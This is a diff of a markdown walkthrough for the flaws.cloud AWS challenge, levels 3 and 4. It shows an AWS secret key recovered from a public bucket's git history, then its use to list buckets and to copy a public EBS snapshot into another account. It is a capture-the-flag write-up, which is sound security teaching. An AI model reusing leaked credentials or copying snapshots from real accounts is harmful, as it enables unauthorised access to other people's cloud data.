@@ -479,36 +479,172 @@ And listing the files works again. Note how this is a git directory
 2017-02-26 19:14:33         26 robots.txt
 
 ```
-There's this tool called <a href="https://github.com/trufflesecurity/trufflehog">Trufflehog</a> which allows secret scanning on a git directory. What's cool about it is how it also works on S3 buckets, and it actually catches an access key for the user `backup`
+After downloading the entire bucket and running the command **`git log`** to see commit history, it seems like Scott committed something interesting by accident
 ```
-──(kali㉿kali)-[~/Desktop]
-└─$ trufflehog s3 --bucket=level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
-🐷🔑🐷  TruffleHog. Unearth your secrets. 🐷🔑🐷
+┌──(kali㉿kali)-[~/Desktop/bucket]
+└─$ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ .             
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/HEAD to .git/HEAD
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/config to .git/config
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/description to .git/description
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/COMMIT_EDITMSG to .git/COMMIT_EDITMSG
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/post-update.sample to .git/hooks/post-update.sample
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-applypatch.sample to .git/hooks/pre-applypatch.sample
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/applypatch-msg.sample to .git/hooks/applypatch-msg.sample
+download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/pre-rebase.sample to .git/hooks/pre-rebase.sample
+<snip>
 
-Found verified result 🐷🔑
-Detector Type: AWS                                                                                                                                                                                                                          
-Decoder Type: PLAIN                                                                                                                                                                                                                         
-Raw result: AKIAJ366LIPB4IJKT7SA                                                                                                                                                                                                            
-Account: 975426262029
-User_id: AIDAJQ3H5DC3LEG2BKSLC                                                                                                                                                                                                              
-Arn: arn:aws:iam::975426262029:user/backup                                                                                                                                                                                                  
-Bucket: level3-9afd3927f195e10225021a578e6f78df.flaws.cloud                                                                                                                                                                                 
-Email: Unknown                                                                                                                                                                                                                              
-File: .git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2                                                                                                                                                                                
-Link: https://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud.s3.us-west-2.amazonaws.com/.git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2                                                                                         
-Timestamp: 2017-09-17 15:12:25 +0000 UTC                                                                                                                                                                                                    
+┌──(kali㉿kali)-[~/Desktop/bucket]
+└─$ git log  
+commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
+Author: 0xdabbad00 <scott@summitroute.com>
+Date:   Sun Sep 17 09:10:43 2017 -0600
+
+    Oops, accidentally added something I shouldn't have
+
+commit f52ec03b227ea6094b04e43f475fb0126edb5a61
+Author: 0xdabbad00 <scott@summitroute.com>
+Date:   Sun Sep 17 09:10:07 2017 -0600
+
+    first commit
+```
+To see what was committed by accident, use **`git checkout`** followed by the hash token. We got access keys!
+```
+┌──(kali㉿kali)-[~/Desktop/bucket]
+└─$ git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
+M       index.html
+Previous HEAD position was b64c8dc Oops, accidentally added something I shouldn't have
+HEAD is now at f52ec03 first commit
                                                                                                                                                                                                                                             
-2025-10-09T12:12:09-04:00       info-0  trufflehog      finished scanning       {"chunks": 73, "bytes": 396944, "verified_secrets": 1, "unverified_secrets": 0, "scan_duration": "4.155525243s"}
+┌──(kali㉿kali)-[~/Desktop/bucket]
+└─$ ls -alh
+total 164K
+drwxrwxr-x 3 kali kali 4.0K Oct  9 12:49 .
+drwxr-xr-x 3 kali kali 4.0K Oct  9 12:45 ..
+drwxrwxr-x 7 kali kali 4.0K Oct  9 12:49 .git
+-rw-rw-r-- 1 kali kali   91 Oct  9 12:49 access_keys.txt
+-rw-rw-r-- 1 kali kali 121K Feb 26  2017 authenticated_users.png
+-rw-rw-r-- 1 kali kali 1.6K Feb 26  2017 hint1.html
+-rw-rw-r-- 1 kali kali 1.4K Feb 26  2017 hint2.html
+-rw-rw-r-- 1 kali kali 1.3K Feb 26  2017 hint3.html
+-rw-rw-r-- 1 kali kali 1.1K Feb 26  2017 hint4.html
+-rw-rw-r-- 1 kali kali 1.9K May 22  2020 index.html
+-rw-rw-r-- 1 kali kali   26 Feb 26  2017 robots.txt
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop/bucket]
+└─$ cat access_keys.txt 
+access_key AKIAJ366LIPB4IJKT7SA
+secret_access_key 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
 ```
 
+Use **`aws configure`** to configure a new profile with the stolen keys, followed by a call to the S3 service to list buckets we now have access to
+```
+┌──(kali㉿kali)-[~/Desktop/bucket]
+└─$ aws s3 ls --profile pwned                                              
+2017-02-12 16:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
+2017-05-29 12:34:53 config-bucket-975426262029
+2017-02-12 15:03:24 flaws-logs
+2017-02-04 22:40:07 flaws.cloud
+2017-02-23 20:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+2017-02-26 13:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
+2017-02-26 13:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
+2017-02-26 14:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud
+2017-02-26 14:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
+2017-02-26 15:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud
+```
 
-
-
-
+Obviously hacker-me immediately tried browsing to levels 5 and 6, but that won't work :p 
 
 <br>
 
 ### Level 4
+```
+For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it.
+```
+Sounds like we'll be stealing and loading someone else's snapshot.
+First gathering some information about the bucket and the hijacked user
+```
+┌──(kali㉿kali)-[~/Desktop/bucket]
+└─$ host 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
+4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud is an alias for ec2-54-202-228-246.us-west-2.compute.amazonaws.com.
+ec2-54-202-228-246.us-west-2.compute.amazonaws.com has address 54.202.228.246
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop/bucket]
+└─$ aws sts get-caller-identity --profile pwned                                                   
+{
+    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
+    "Account": "975426262029",
+    "Arn": "arn:aws:iam::975426262029:user/backup"
+}
+```
+With the region and the user ID, it's now possible to call **`ec2 describe-snapshost`**. The next command shows how anyone can create volumes from this snapshot. In other words, the snapshot is public
+```
+┌──(kali㉿kali)-[~/Desktop/bucket]
+└─$ aws ec2 describe-snapshots --profile pwned --owner-id 975426262029 --region us-west-2         
+{
+    "Snapshots": [
+        {
+            "Tags": [
+                {
+                    "Key": "Name",
+                    "Value": "flaws backup 2017.02.27"
+                }
+            ],
+            "StorageTier": "standard",
+            "TransferType": "standard",
+            "CompletionTime": "2017-02-28T01:37:07+00:00",
+            "SnapshotId": "snap-0b49342abd1bdcb89",
+            "VolumeId": "vol-04f1c039bc13ea950",
+            "State": "completed",
+            "StartTime": "2017-02-28T01:35:12+00:00",
+            "Progress": "100%",
+            "OwnerId": "975426262029",
+            "Description": "",
+            "VolumeSize": 8,
+            "Encrypted": false
+        }
+    ]
+}
+
+┌──(kali㉿kali)-[~/Desktop/bucket]
+└─$ aws ec2 describe-snapshot-attribute --snapshot-id snap-0b49342abd1bdcb89 --attribute createVolumePermission --profile pwned --region us-west-2
+{
+    "SnapshotId": "snap-0b49342abd1bdcb89",
+    "CreateVolumePermissions": [
+        {
+            "Group": "all"
+        }
+    ]
+}
+```
+
+I can now create a volume in my own account from the public snapshot. Note how I didn't specify a profile since it defaults to my own account
+```
+┌──(kali㉿kali)-[~/Desktop/bucket]
+└─$ aws ec2 create-volume --availability-zone us-west-2a --region us-west-2 --snapshot-id snap-0b49342abd1bdcb89         
+{
+    "Iops": 100,
+    "Tags": [],
+    "VolumeType": "gp2",
+    "MultiAttachEnabled": false,
+    "VolumeId": "vol-027133a97079dd855",
+    "Size": 8,
+    "SnapshotId": "snap-0b49342abd1bdcb89",
+    "AvailabilityZone": "us-west-2a",
+    "State": "creating",
+    "CreateTime": "2025-10-09T18:01:18+00:00",
+    "Encrypted": false
+}
+```
+
+I won't add the screenshots here, but the next step is to create an EC2 instance and attach this volume to it. You can create an instance by browsing to EC2 > Launch Instance
+
+
+
+---- next step is to attach the volume to the new instance in my own account, mount it, launch the instance an enumerate it from there ---------
+
+
+
 
 
 
